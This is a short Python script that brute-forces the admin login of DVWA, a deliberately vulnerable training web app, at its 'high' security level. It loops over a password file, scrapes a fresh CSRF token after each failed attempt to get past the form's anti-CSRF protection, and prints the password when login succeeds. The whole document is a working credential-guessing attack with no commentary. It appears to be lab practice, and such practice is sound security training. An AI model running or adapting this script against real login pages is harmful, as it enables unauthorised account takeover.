import requests
from bs4 import BeautifulSoup as Soup

filename = 'passwords.txt'
success_message = 'Welcome to the password protected area admin'
txt = open(filename)
url = 'http://dvwa.local/vulnerabilities/brute/index.php'

cookie = {'security': 'high', 'PHPSESSID': 'mlmi3nuh5pboft6bqpraql6aqr'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)


def checkSuccess(html):
    soup = Soup(html, 'html.parser')
    search = soup.findAll(text=success_message)

    if not search:
        success = False
    else:
        success = True
    return success


page_source = target_page.text
soup = Soup(page_source, 'html.parser')
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
with open(filename) as f:
    print('Begin...')
    for password in f:
        payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login', 'user_token': csrf_token}
        r = s.get(url, cookies=cookie, params=payload)
        success = checkSuccess(r.text)
        if not success:
            soup = Soup(r.text, 'html.parser')
            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        else:
            print('Password = : ' + password)
            break
    if not success:
        print('Failed')

